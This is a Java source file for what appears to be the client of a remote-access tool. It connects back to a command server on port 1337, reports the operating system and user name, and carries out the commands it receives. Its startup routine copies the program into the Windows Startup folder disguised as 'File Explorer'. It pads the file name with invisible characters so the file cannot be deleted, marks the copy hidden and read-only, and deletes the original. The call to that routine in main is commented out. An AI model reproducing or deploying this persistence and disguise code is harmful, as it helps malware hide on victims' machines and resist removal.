package Client;

import UI.CPU_Usage;
import UI.Disk_Usage;
import Ultils.MessageType;
import Ultils.NetUtils;
import Ultils.Packet;
import oshi.SystemInfo;
import oshi.software.os.FileSystem;
import oshi.software.os.OSFileStore;

import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;

public class Client {
    public static final int PORT = 1337;
    public static final long DELAY = 5000;
    public static final String IP = "127.0.0.1";
    public static final StartupMode startup = StartupMode.HIDDEN;
    private enum StartupMode {
        NONE,
        NORMAL,
        HIDDEN
    }
    private static ClientManager manager;
    private PrintWriter pw;

    public Client() {
        this.run();
    }

    public void run() {
        try {
            Socket s = null;
            while (s == null) {
                try {
                    s = new Socket(IP, PORT);
                    pw = new PrintWriter(s.getOutputStream(), true);
                    this.sendInfo(pw, s);
                } catch (Exception e) {}
                Thread.sleep(DELAY);
            }
            BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
            boolean dead = false;
            while (!dead) {
                try {
                    String line = br.readLine();
                    if (line == null) {
                        dead = true;
                        return;
                    }
                    Packet packet = NetUtils.readPacket(line);
                    try {
                        manager.onMessage(packet, pw);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } catch (SocketException e2) {
                    this.run();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        this.run();
    }

    private void sendInfo(PrintWriter pw, Socket s) {
        try {
            Packet packet = new Packet();
            packet.action = MessageType.HARDWARE_INFO.getID();
            packet.data = Arrays.asList(new String[] {System.getProperty("os.name"), System.getProperty("user.name")});
            NetUtils.sendMessage(packet, pw);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendCpuUsage(PrintWriter pw, Socket s)
    {
        SystemInfo si = new SystemInfo();
        CPU_Usage cpu_usage = new CPU_Usage();
        try {
            Packet packet = new Packet();
            packet.action = MessageType.PERFORMANCE_TRACK.getID();

            double cpuResult = cpu_usage.cpuData();
            double[] procResult = cpu_usage.procData(si.getHardware().getProcessor());
            String[] result = new String[procResult.length];

            for (int i = 0; i < result.length; ++i){
                result[i] = String.valueOf(procResult[i]);
            }

            packet.data = Arrays.asList(result);
            packet.data.add(Double.toString(cpuResult));  // System usage is the first index TODO:this is stupid, need better
            NetUtils.sendMessage(packet,pw);
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private  void sendDiskUsage(PrintWriter pw, Socket s){
        SystemInfo si = new SystemInfo();
        Disk_Usage disk_usage = new Disk_Usage(si);

        try {
            Packet packet = new Packet();
            packet.action = MessageType.STORAGE_TRACK.getID();

            FileSystem fs = si.getOperatingSystem().getFileSystem();
            List<OSFileStore> osFileStores = fs.getFileStores();

            List<String> result = null;

            for (int i = 0; i < osFileStores.size(); ++i)
            {
                result.set(i, osFileStores.get(i).toString());
            }

            packet.data = result;
            NetUtils.sendMessage(packet,pw);
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private static void startup() throws URISyntaxException, IOException {
        File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
                .toURI());
        String fileName = "File Explorer";
        File startupLoc = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        if (!jar.exists() || jar.getName().contains(fileName) || !startupLoc.exists()) {
            return;
        }
        String e = jar.getName().contains(".") ? "." + jar.getName().split("\\.")[jar.getName().split("\\.").length - 1] : ".jar";
        if (startup.equals(StartupMode.NORMAL)) {
            boolean created = false;
            for (int l = 0; l < 15; l++) {
                if (!created) {
                    try {
                        // this StringBuilder makes files undeletable in windows.
                        StringBuilder sb = new StringBuilder(fileName);
                        for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
                            sb.append("\u200e");
                        }
                        sb.append(e);
                        File file = null;
                        Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
                        created = true;
                        file.setWritable(false);
                    } catch (Exception eee) {}
                }
            }
        } else if (startup.equals(StartupMode.HIDDEN)) {
            boolean created = false;
            for (int l = 0; l < 15; l++) {
                if (!created) {
                    try {
                        StringBuilder sb = new StringBuilder(fileName);
                        for (int i = 0; i < 259 - l - fileName.length() - e.length(); i++) {
                            sb.append("\u200e");
                        }
                        sb.append(e);
                        File file = null;
                        Files.copy(Paths.get(jar.getPath()), new FileOutputStream(file = new File(startupLoc, sb.toString())));
                        created = true;
                        file.setWritable(false);
                        Files.setAttribute(Paths.get(file.getPath()), "dos:hidden", true);
                        jar.delete();
                    } catch (Exception eee) {}
                }
            }
        }
    }

    public static void main(String[] args) {
        /*
        if (args.length > 0) {
            try {
                Thread.sleep(8000);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            try {
                new File(args[0]).delete();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        try {
            startup();
        } catch (Exception e) {
            e.printStackTrace();
        }
        */
        manager = new ClientManager();
        new Client();
    }
}
